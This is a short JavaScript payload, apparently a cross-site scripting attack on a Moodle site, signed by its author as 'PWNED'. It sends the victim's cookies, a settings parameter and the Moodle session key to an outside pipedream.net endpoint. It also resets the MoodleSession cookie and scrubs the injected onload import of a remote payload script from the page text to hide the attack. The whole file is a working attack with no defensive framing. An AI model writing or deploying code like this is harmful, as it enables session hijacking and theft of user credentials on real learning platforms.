//btw PWNED BY NZRXHX
fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+document.cookie+"&id="+document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param')+"&sesskey="+M.cfg.sesskey);
document.cookie='MoodleSession=0;path=/';
(() => {
  const targets = [
    `"onload="import('//nzrxhx.github.io/payloads/payload.js')`,
    `⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`
  ];

  const walker = document.createTreeWalker(
    document.body,
    NodeFilter.SHOW_TEXT,
    null
  );

  let node;
  while ((node = walker.nextNode())) {
    targets.forEach(target => {
      if (node.nodeValue.includes(target)) {
        node.nodeValue = node.nodeValue.replace(target, '');
      }
    });
  }
})();
